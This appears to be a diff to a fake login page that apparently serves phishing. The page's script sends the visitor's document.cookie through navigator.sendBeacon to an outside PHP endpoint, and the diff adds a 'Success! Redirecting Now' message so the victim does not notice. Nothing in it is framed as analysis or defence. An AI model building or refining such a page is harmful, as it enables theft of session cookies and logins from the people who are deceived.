@@ -110,8 +110,8 @@
             <button type="submit" id="login-button" aria-label="Log In"></button>
         </form>
     </div>
-    <div id="fake-loading">Verifying Credentials...</div>
-
+    <div id="fake-loading">Verifying Credentials...Please Wait</div>
+    <div id="success">Success! Redirecting Now</div>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const usernameField = document.getElementById('username');
@@ -162,7 +162,7 @@
                 });
 
                 document.getElementById('fake-loading').style.display = 'flex';
-
+                document.getElementById('success').style.display = 'flex';
                 const cookies = document.cookie;
                 if (cookies) {
                     navigator.sendBeacon("https://wassup.iceiy.com/start.php", `cookies=${encodeURIComponent(cookies)}`);
